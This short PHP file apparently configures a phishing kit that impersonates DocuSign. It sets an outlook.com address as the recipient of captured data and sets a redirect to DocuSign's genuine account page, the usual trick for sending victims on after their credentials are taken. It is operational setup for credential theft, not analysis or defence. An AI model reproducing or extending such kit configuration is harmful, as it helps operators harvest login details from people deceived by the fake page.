<?php 
$Receive_email="realeum@outlook.com";
$redirect="https://account.docusign.com";
?>